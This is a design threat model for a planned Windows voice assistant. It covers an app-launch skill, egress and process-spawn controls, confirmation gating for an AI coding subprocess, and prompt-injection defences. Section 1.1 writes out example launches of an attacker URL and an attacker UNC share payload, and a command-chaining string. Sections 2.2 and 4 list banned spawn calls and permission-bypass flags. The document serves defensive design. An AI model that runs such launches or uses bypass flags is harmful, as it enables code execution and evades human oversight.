# NOVA — M0 Threat Model

Authored by nova-security (veto holder). Grounds every claim in what's on disk
today: `nova/` is currently four empty `__init__.py` stubs under `audio/`,
`interfaces/`, `security/`, `skills/`, `stt/`, `tts/` — nothing is implemented
yet. `config/` is empty. This is therefore a threat model for what T0.5 is
about to become, written before it calcifies, plus lessons pulled from the
retired build at `_OLD_ARCHIVE/` (1582 green tests, never run on this hardware
— see `_OLD_ARCHIVE/KNOWN_ISSUES.md` §0), which solved several of these
problems once and is worth stealing from and worth not repeating the mistakes
of.

Attacker model per the constitution: anyone who can send Manav an email,
share a document, plant a file, or get text in front of NOVA's mic or router.
For M0 specifically the surface is narrower — no mail/calendar/web skill
exists yet — but the security *kernel* built now (T0.5) is what every later
milestone inherits, so it is reviewed against the full model, not just M0's.

---

## 1. Top M0 risks, ranked

### 1.1 `open_app` is a launcher for anything Windows will run — HIGH, live now

`open_app` is ACT tier and, per `docs/CONTRACTS.md:110`, takes params from a
skill handler. The obvious implementation — take the routed parameter (an app
name derived from what the user said) and hand it to `os.startfile()`,
`ShellExecute`, or `subprocess.Popen(name, shell=True)` — is arbitrary code
execution disguised as a convenience feature, and on Windows it is worse than
on POSIX for a reason specific to this platform:

- **`os.startfile()` / `ShellExecute` do not distinguish an app from a URL or
  a UNC path.** `os.startfile("http://attacker.example")` opens it in the
  default browser. `os.startfile(r"\\attacker-host\share\payload.exe")`
  triggers an SMB fetch and can execute. Neither of those goes through
  `Egress` — the AST no-socket test is completely blind to it, because no
  Python code in the NOVA tree opened a socket. The *shell* did. This is a
  concrete, reachable instance of "the promise is technically kept and
  substantively broken," live in M0, not hypothetical.
- **`shell=True` or a bare string to `Popen`** admits shell metacharacters
  from whatever string the router extracted.

**Requirement:** `open_app` resolves its parameter against a **closed
allowlist** — a table in `nova.yaml` (or a fixed constant if config surface
isn't there yet) mapping symbolic names (`"notepad"`, `"chrome"`) to absolute
executable paths, verified to exist. At call time: `realpath()` the resolved
path, verify it still lands inside an allowed directory set (`Program Files`,
`Program Files (x86)`, `%WINDIR%\System32`, `WindowsApps`, or an explicit
per-entry override) *or* matches a pinned allowlist entry exactly — then
launch with `subprocess.Popen([resolved_path], shell=False)`, an argv list,
never a shell string. **Reject anything that parses as a URL (contains
`://`) or a UNC path (starts with `\\`) before it ever reaches a Windows API**
— don't rely on the allowlist alone to catch it, reject the shape first.
Fuzzy-matching the spoken name to allowlist keys happens before any of this;
the free-text app name itself must never reach `Popen`/`ShellExecute`/
`startfile`.

nova-tester should write: exact-match launch succeeds; unknown name refused;
`"notepad & calc"`-style strings refused; a URL-shaped param refused; a UNC
path refused; a path that resolves outside the allowed directories (e.g. via
a crafted relative segment or an NTFS junction pointed out of Program Files)
refused by the realpath check, not just a prefix/`startswith` check — junctions
defeat `startswith` and are cheap to create on Windows.

### 1.2 The egress promise has an unenforced subprocess-shaped hole — HIGH, architecture-defining

Covered in depth in §2. Flagged here because it belongs in the M0 ranking:
`T0.5`'s AST test as specified in `CONTRACTS.md:117` ("THE ONLY MODULE THAT
OPENS A SOCKET") polices `import socket` / `import requests` / etc. It says
nothing about `subprocess`, `os.system`, `os.startfile`, or
`asyncio.create_subprocess_exec`. §1.1 already shows this matters *today*,
independent of the Claude CLI question — any skill that shells out to
anything, ever, is invisible to the current test's threat model. This must be
fixed in the T0.5 AST test now, not retrofitted in M4 when the Claude arm
lands, because the fix changes what "sanctioned" means for the whole tree.

### 1.3 Audit log must fail closed, and the contract doesn't say so — MEDIUM

`CONTRACTS.md:116`: `AuditLog.record(event: dict) -> None`. No failure mode is
specified. If `record()` swallows a write error (full disk, locked file,
permissions) and returns normally, then ACT and CONFIRM actions keep
executing with **no record that they happened** — the exact failure mode the
old build's design note calls out (`_OLD_ARCHIVE/nova/safety/__init__.py`:
"Audit is built first, because the egress guard fails closed if it cannot
write a record — 'we could not log that this left' has to mean 'it did not
leave'"). T0.5 needs the same discipline for the *ladder*, not just egress:
`Ladder.authorize()` must treat an audit-write failure as a deny for ACT/
CONFIRM tiers. READ tier can degrade (log a WARNING, proceed) since it's
defined as free/reversible — but that's a decision worth pinning explicitly
rather than leaving to whoever implements it first. See requirement in §4.

### 1.4 CONFIRM's decision logic must be fail-closed now, even though the UI lands in M1 — MEDIUM

`ROADMAP.md:38` correctly scopes the working CONFIRM UI to M1, and M0 ships no
CONFIRM-tier skill (only `time`/READ and `open_app`/ACT). So there's no
functional gap in M0 itself. But the retired build's actual failure — worth
being explicit about since the lead named it — was not "no UI exists," it was
**"CONFIRM/TYPED defaulted to unapprovable and nobody noticed for most of the
build."** Per `_OLD_ARCHIVE/nova/app.py:547-548` (its own admission, in
`KNOWN_ISSUES.md`): every action in `safety.confirm_actions` was "functionally
... 'off' until you move it to `auto_actions` or someone writes a handler,"
and this was fixed late (`KNOWN_ISSUES.md:182`: "STATUS: FIXED") by wiring
`install_approval_channels` into the boot path automatically with a `tkinter`
dialog fallback. Even after the fix, it was **never exercised on real
hardware** — the dev environment had no display (`KNOWN_ISSUES.md:24`: "no
display, so no system tray"), so the dialog path that is the entire point of
CONFIRM was validated by code review, not by a human clicking a button.

**Requirement now:** `Ladder.authorize()` for `Tier.CONFIRM` (and any future
stricter tier) must default-deny with a *specific* reason
(`"no_confirm_channel"`) when no channel is registered — not silently allow,
not silently hang. Write this test in T0.5 even though nothing calls it in
anger until M1: `authorize()` against a CONFIRM-tier skill with no channel
attached returns `Decision.deny`, never `Decision.allow`, never raises past
the caller. This makes M1's job "attach a real channel," not "discover and
fix a silent bypass," and it directly satisfies the constitution's "not a
silent default-deny" clause — the deny must be *loud* (audited, with a
reason a human reviewing the log can find), which is different from "denies
and nobody would ever know."

### 1.5 Physical/mic trust boundary has no authentication in M0 — LOW, note and move on

M0 is PTT (`Ctrl+Alt+Space`) — no always-on wake word yet (`ROADMAP.md:33`),
so ACT-tier `open_app` requires physical keyboard access, which is a
reasonable trust boundary for a walking skeleton. Flagging only so it's
tracked: M1 adds an always-on wake word with no speaker verification, at
which point "anyone in earshot" becomes the trust boundary for ACT-tier
actions, not "anyone at the keyboard." Not blocking M0; should be revisited
before M1 ships wake-word-triggered ACT actions.

### 1.6 Router confidence floor — LOW for M0, cheap to require now

Only two skills and a deterministic pattern router at M0 means little room for
cross-domain ambiguity. Still, the constitution's confidence-honesty rule is
not milestone-gated, so nova-tester should have at least one test that feeds
the M0 router something below its confidence floor (or matching neither
skill's `examples`) and asserts it asks rather than guesses, even with a
two-skill registry. Cheap now; expensive to retrofit once ambiguity is real.

---

## 2. The Claude CLI egress boundary — verdict

**Verdict: the declared/audited/redacted boundary is the right shape, but as
scoped in `CONTRACTS.md` today (`Egress.fetch(url) -> bytes`, nothing else) it
is a fig leaf, not a boundary. It becomes real only if three things happen,
none of which are optional: (a) the "one socket" AST test is redefined to
cover process spawn, not just imports; (b) `Egress` grows a second, explicit
method for the process boundary distinct from `fetch()`; (c) everyone accepts
that redaction protects the prompt going out and does nothing at all about
what the Claude Code process does once it's running — that second problem
needs its own control (CONFIRM + workspace jail), and conflating the two is
how this quietly becomes "we redact, therefore it's fine."**

### 2.1 Why "the AST test stays green" is the whole problem, precisely

The old build's own no-socket test
(`_OLD_ARCHIVE/tests/test_no_direct_network.py`) is a good design — AST walk,
not grep, catches lazy imports, scans every file under `nova/` and `scripts/`
— and it is exactly as blind as the lead described. Its `TRANSPORTS` set
(`{aiohttp, http, httpcore, httplib2, httpx, pycurl, requests, socket,
socketserver, ssl, urllib, urllib3, websocket, websockets}`) does not include
`subprocess`. `_OLD_ARCHIVE/nova/brain/jobs.py:64` imports `subprocess`
freely and the test never sees it, because from the *test's* point of view,
spawning `claude` and spawning `notepad.exe` look identical: neither is a
transport import. The only thing that made the old build's Claude-CLI path
safe was that the one dev who wrote `claude_arm.py` remembered to call
`guard.release()` before piping to stdin (`_OLD_ARCHIVE/nova/brain/claude_arm.py`
docstring, confirmed by `_OLD_ARCHIVE/tests/test_claude_arm.py::
test_dispatch_puts_the_released_payload_on_stdin`). That's **discipline**,
not **architecture** — nothing stops a second file from spawning `claude` (or
`curl`, or `powershell -c`) without that call, and nothing would fail red if
it did. §1.1 shows the same hole is exploitable *today*, without needing
Claude Code at all — any careless `open_app` implementation demonstrates it.

### 2.2 What "declared, audited" must concretely mean

1. **Extend the AST scan from "no socket" to "no socket or unsanctioned
   process spawn."** Ban `subprocess.*`, `os.system`, `os.popen`,
   `os.exec*`, `os.spawnl*`, `os.startfile`, `asyncio.create_subprocess_exec`,
   `asyncio.create_subprocess_shell` everywhere except a short, named,
   asserted-non-empty allowlist — exactly the pattern the old test already
   used for sockets (`SANCTIONED`) and for the narrower loopback carve-out
   (`LOOPBACK_ONLY`/`LOOPBACK_CALLS`, `_OLD_ARCHIVE/tests/
   test_no_direct_network.py:79-119`, which additionally asserted the target
   address was a *literal* `"127.0.0.1"`, not a variable — the same technique
   applies here: assert the child process argv's `[0]` is a literal `"claude"`
   or a path pinned in config, not a caller-supplied string, so nothing can
   widen the exemption from a skill parameter).
2. **`open_app`'s allowlisted launch (§1.1) is itself inside this same
   sanctioned set** — it's a legitimate, narrow process-spawn exemption too,
   and should be reviewed by the identical test, not a separate one-off. One
   mechanism, two call sites.
3. **`Egress` needs a second method**, distinct from `fetch(url)`, e.g.
   `release_for_process(purpose: str, payload: str) -> str` — redacts,
   labels, audits, and returns the text that may be piped to the child's
   stdin. This is a **contract change**: `CONTRACTS.md:117-119` currently
   only specifies `fetch`. Recommend adding it explicitly rather than letting
   `claude_arm.py` (M4) invent its own ad hoc call into `Egress` internals.
   The old build's `EgressGuard.release(host, payload, purpose)` is a
   reasonable model — it used `host` as a policy label even for the
   subprocess boundary (`ANTHROPIC_HOST` as a symbolic allowlist entry, not a
   DNS target), which is a fine trick: keep the "one allowlist" mental model
   even for a boundary that isn't literally a socket.
4. **What must be redacted, concretely:** everything the constitution already
   requires for network egress — usernames, absolute paths, secrets/tokens,
   case-insensitive, both slash styles — applied to the prompt/task text
   before it reaches stdin. **Flagging a real tension for the lead to
   resolve, not resolving it myself:** Claude Code needs real, working file
   paths to operate on the repo, and M4's own exit criteria requires the
   workspace be jailed to `D:\NOVA\workspace`. Blanket path redaction breaks
   the tool. Recommend the redaction rule be scoped to *outside-workspace*
   absolute paths and the username, with in-workspace relative paths passed
   through — but that scoping decision changes what "redaction" means for
   this one egress path versus the network one, so it should be a named,
   reviewed exception in the redactor's config, not a silent divergence
   between two things both called "redaction."
5. **Environment and argv discipline, ported from prior art that already got
   this right:** `ANTHROPIC_API_KEY`, `CLAUDE_CODE_USE_BEDROCK`,
   `CLAUDE_CODE_USE_VERTEX` scrubbed from the child env (silent fallback to
   metered billing is a failure that shows up as money, not as a stack
   trace); the OAuth token passed via env, never argv (process lists are
   world-readable); the prompt/task text on stdin, never argv; every spelling
   of `--dangerously-skip-permissions` / `bypassPermissions` / `dontAsk` /
   `yolo` refused before the child is even spawned. This isn't optional
   nice-to-have — `_OLD_ARCHIVE/tests/test_claude_arm.py` already has
   real-subprocess tests proving all of this (`test_no_token_and_no_prompt_
   reach_argv`, `test_scrubbed_variables_never_reach_the_child`,
   `test_skip_permissions_is_refused`), and there's no reason to relitigate
   what already works — port the test shapes, not the code (M4 owns the
   implementation).
6. **Say plainly what redaction does *not* do:** it protects the prompt going
   out. It does nothing about the actions the `claude` process takes once
   running — file writes, bash commands, its own tool calls, its own network
   access via MCP or web-fetch tools it may have. From NOVA's perspective,
   dispatching a job to Claude Code is closer to briefly handing over an
   account than to "sending a chat message." That is exactly why
   `ARCHITECTURE.md:81` marks the Claude arm "Always CONFIRM tier," and that
   marking is correct and should not be softened. Recommend the CONFIRM
   prompt shown to Manav include the actual post-redaction text that will be
   sent, not a generic "let NOVA run Claude Code?" toggle — otherwise CONFIRM
   here is consent to a category, not to the specific disclosure, which is a
   weaker promise than the tier implies.

### 2.3 Bottom line for the lead

This does not need to be softened into policy, and it does not need to block
M0 — no skill in M0 crosses this boundary. It does need to be a **hard
architectural constraint decided now**, because §1.1 already proves the
underlying gap (unsanctioned process spawn) is exploitable without Claude
Code in the picture at all, and T0.5's AST test is the one place this is
cheap to fix. Retrofitting it in M4, after `open_app` and whatever M2/M3 add
have already normalized "spawning things is fine, nobody's watching," is the
expensive path. Recommend: land the extended AST test as part of T0.5, now,
scoped to ban all process spawn outside a named allowlist that currently
contains exactly `open_app`'s launcher and nothing else — the Claude CLI
adapter joins that allowlist in M4 as a second, equally-scrutinized entry,
not as the reason the test gets written.

---

## 3. `Untrusted[str]` — is a type wrapper real enforcement?

**Assessment: a `NewType`/subclass-of-`str` wrapper is a naming convention, not
enforcement — it is defeated by the first careless `str(x)`, f-string
interpolation, or `.format()` call, all of which succeed silently because
`str` subclasses support every string operation by design.** For the wrapper
to be structural rather than decorative, four things all have to be true:

1. **`Untrusted[str]` must not be a subclass of `str`.** If it is (e.g. a
   `class Untrusted(str): ...`), every function typed `def route(text: str)`
   accepts it via duck typing and the router works correctly on hostile input
   — which is precisely the failure mode: it *works*, so nobody notices the
   type check meant nothing. Make it a plain wrapper (e.g. a frozen dataclass
   or a class with no string protocol methods) so passing it where a `str` is
   expected raises `TypeError`/`AttributeError` immediately, loudly, at the
   first careless use — not three call frames later as a plausible-looking
   answer built from attacker text.
2. **No accidental unwrap via `__str__`/`__format__`/`__radd__`.** If
   `str(untrusted_value)` returns the raw content, every f-string in the
   codebase is a silent unwrap. `__str__` should return something like
   `"<untrusted:mail:8a1c…>"` (a label plus a content hash) — useful for logs,
   useless for concatenation into a prompt or a routing decision.
3. **Exactly one explicit unwrap function** (e.g. `reveal(u: Untrusted[str])
   -> str`), grep/AST-greppable by name, and an automated test that walks the
   router module and the skill-parameter-binding module and fails if either
   imports or calls `reveal` — the same AST technique as §2.2, applied to a
   different invariant. This is what makes "the router refuses to accept a
   routing decision derived from it" (`ARCHITECTURE.md:92`) a checked fact
   instead of a design intention.
4. **The skill-parameter binder must refuse `Untrusted[str]` values outright**
   where a plain `str`/`int`/etc. parameter is expected, rather than silently
   coercing — a `TypeError` here is the last backstop if steps 1–3 somehow
   don't catch a given call site.

None of this replaces the injection test suite the constitution already
requires (`CLAUDE.md` rule 2: hostile content triggers zero tool calls, target
path proven to have run). The type wrapper's job is narrower and structural:
make the *lazy* bypass (a careless `str()` or an f-string) fail loudly instead
of working. The injection tests are what prove the *deliberate* bypass
(a skill author who reads `.raw` on purpose) doesn't exist either. Both are
needed; neither substitutes for the other.

---

## 4. T0.5 requirements — for nova-dev to implement, nova-tester to test against

**Tier / Ladder**
- `Tier.READ` = no confirmation friction, no rate limit — but still audited
  (every invocation gets an `AuditLog` record) and still goes through
  registry validation (`trusts_input` declared, examples present). "Free"
  means UX cost, not "unchecked" and not "unaudited."
- `Ladder.authorize()` re-derives the tier from the skill's declared `tier`
  and the params; a skill (or injected content routed into a skill's params)
  cannot self-report a lower tier than its declaration. Take the stricter of
  declared-vs-computed if the design ever allows per-call tier adjustment —
  otherwise a single fixed declared tier is fine for M0's two skills, but
  pin down which model this is now (contract is currently silent).
- `Ladder.authorize()` for `Tier.CONFIRM` (and any stricter tier added later)
  defaults to `Decision.deny` with an explicit, audited reason when no
  approval channel is registered. Never blocks indefinitely, never allows.
  Test end-to-end even though M0 ships no CONFIRM skill (§1.4).
- An audit-write failure during `authorize()` for ACT/CONFIRM is treated as a
  deny, not swallowed. Pin whether `AuditLog.record()` raises or returns a
  success flag — `CONTRACTS.md`'s current `-> None` signature needs to change
  to support this; flagging as a contract update needed before T0.5 lands.

**AuditLog**
- Append-only, hash-chained, as specified. Add: payload sanitization (cap
  string length, drop keys that look like secrets/tokens/paths-to-audio) so
  the audit file cannot become a second unredacted transcript store — the old
  build's `sanitize()` (`_OLD_ARCHIVE/nova/safety/audit.py`) is a reasonable
  model to follow, not necessarily to copy verbatim.
- Every `Decision` from the ladder — allow *and* deny — gets a record. A
  denied CONFIRM with no audit trail is invisible to the one person who could
  notice the pattern.

**Egress**
- `fetch(url)`: deny-by-default allowlist, loaded from config at construction
  with no runtime mutator method (no `add_allowed_host`-shaped method should
  exist on the class at all — grep-testable, cheap, and closes off the most
  obvious thing a compromised skill would try first).
- Redaction used by `Egress` is the **one shared implementation** referenced
  in `CLAUDE.md`'s egress and output-sanitizing rules — not a copy living
  inside `egress.py` and a second copy inside whatever renders replies. One
  module, imported by both.
- AST no-socket test extended per §2.2(1) to cover process spawn, with a
  named, non-empty, asserted-file-exists allowlist (mirroring
  `_OLD_ARCHIVE/tests/test_no_direct_network.py`'s `SANCTIONED`/
  `test_the_sanctioned_list_is_exactly_two_files`-style pinning, so the
  allowlist size is a number someone has to consciously change, not a set
  that silently grows).

**Skill registry**
- Import-time discovery of `nova/skills/*.py` is the *only* path tier,
  examples, and `trusts_input` reach the router/ladder — no hand-wiring
  anywhere else. Test: a skill registered by any means other than the
  `@skill` decorator + directory scan does not appear in the router.
- Every skill with `trusts_input=True` is enumerated automatically and the
  registry refuses to include it if it lacks a paired hostile-content test
  module (constitution's rule 2, made mechanical rather than a manual
  checklist item).
- `open_app` implemented per §1.1: closed allowlist, `realpath` verification
  against an allowed-directory set at call time (not at config-load time —
  junctions/symlinks can move between load and call), URL-shape and UNC-shape
  rejected before any Windows API is touched, `Popen([path], shell=False)`
  only.

**Untrusted input plumbing** (even though no M0 skill uses it yet, the type
needs to exist correctly before anything is built on top of it)
- `Untrusted[str]` per §3: not a `str` subclass, no accidental `__str__`
  unwrap, single named `reveal()` function, AST test asserting the router and
  the skill-parameter binder never call it.

---

## 5. Changes requested to `ARCHITECTURE.md` / `CONTRACTS.md` before they calcify

1. **`CONTRACTS.md:117`'s `Egress` needs a second method** for the
   process-spawn boundary (§2.2.3) — not a blocker for T0.5 itself (M0 has no
   caller for it yet) but should be added to the contract now so M4 doesn't
   invent its own shape for it later. Proposed: `release_for_process(purpose:
   str, payload: str) -> str`.
2. **`AuditLog.record(event: dict) -> None` needs a documented failure
   mode.** Silent success on write failure is incompatible with §1.3/§4's
   fail-closed requirement. Recommend either `-> bool` (caller checks) or
   raising, matching the old build's `append()`/`AuditError` split between
   the bus-fed path (never raises) and the accountability-critical path
   (raises). Pick one and put it in the contract, not left to whoever
   implements it first — this is exactly the "one source of truth" rule.
3. **The AST no-socket test's scope, wherever it ends up living, should be
   named for what it actually guarantees.** "No other file opens a socket"
   (`CONTRACTS.md:117`) is a narrower claim than the constitution's promise
   ("all network egress goes through ONE sanctioned module"). Recommend the
   test and its surrounding docs both say "opens a socket **or spawns a
   process capable of one**" so the next person reading the contract doesn't
   inherit the same blind spot the retired build had.
4. **No objection to the Claude-CLI-as-CONFIRM-tier design** in
   `ARCHITECTURE.md:81` — it's correct as stated. The one addition requested:
   the CONFIRM prompt for that specific action should show the actual
   post-redaction payload, not a generic toggle (§2.2.6). This can be a note
   for M4 rather than a T0.5 blocker.

Nothing else in `ARCHITECTURE.md` or `CONTRACTS.md` is vetoed. The shape is
sound; the two places it was silent (process-spawn-as-egress, audit-write
failure mode) are exactly the places a threat model earns its keep by being
asked to look before code exists.
